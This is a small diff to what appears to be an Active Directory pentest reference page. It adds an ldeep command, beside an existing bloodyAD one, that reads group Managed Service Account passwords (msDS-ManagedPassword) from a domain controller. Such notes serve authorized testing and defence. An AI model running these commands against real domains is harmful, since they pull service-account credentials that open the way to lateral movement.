@@ -53,6 +53,12 @@ print(connection.entries)
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
 ```
 
+---
+**Alternative 4**: Using [ldeep](https://github.com/franc-pentest/ldeep) (Python)
+
+```bash
+ldeep ldap -d "$DOMAIN" -s "$DC_IP" -u "$USER" -p "$PASSWORD" gmsa -t $TargetObject
+```
 
 === Windows
 
